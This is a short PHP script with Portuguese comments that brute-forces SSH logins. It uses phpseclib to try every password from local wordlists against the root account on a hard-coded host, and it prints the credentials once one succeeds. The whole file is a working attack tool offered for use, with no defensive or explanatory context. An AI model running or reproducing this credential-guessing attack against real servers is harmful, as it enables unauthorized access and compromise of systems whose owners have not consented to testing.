<?php

/*
    Copyright (C) 2015  Matheus Fidelis
    This program is free software; you can redistribute it and/or modify
    it under the terms of the GNU General Public License as published by
    the Free Software Foundation; either version 2 of the License, or
    (at your option) any later version.
    This program is distributed in the hope that it will be useful,
    but WITHOUT ANY WARRANTY; without even the implied warranty of
    MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
    GNU General Public License for more details.
 */

function sshbruter() {
    set_include_path(get_include_path() . PATH_SEPARATOR . 'phpseclib');
    include('Net/SSH2.php');

    #Define o Host e o usuário a ser testado
    $host = "192.168.0.102";
    $user = "root";

    #Defina aqui o id da passlist que será utilizada. A mesma está dentro do diretório 'list'
    $passlistid = 1;
    $i = 0;

    #Lê a passlist desejada, selecione 1, 2 ou 2 na variável 'passlistid'
    if ($passlistid == 1) {
        $passList = file_get_contents("list/500_passwords.txt");
    } elseif ($passlistid == 2) {
        $passList = file_get_contents("list/Numbers.dic");
    } elseif ($passlistid == 3) {
        $passList = file_get_contents("list/passlist.txt");
    } $passes = explode("\n", $passList);
    echo "[*] Iniciando o Brute force \n";
    foreach ($passes as $pass) {
        echo "[*] Testando " . $user . " && " . $pass . "\n";

        $ssh = new NET_SSH2($host);
        $i++;
        
        if (!$ssh->login($user, $pass)) {
            
        } else {
            echo "Password Encontrado \n";
            echo "Efetuadas " . $i . " tentativas\n";
            echo "User: " . $user . " && Password: " . $pass . "\n";
            exit;
        }
    }
}

sshbruter();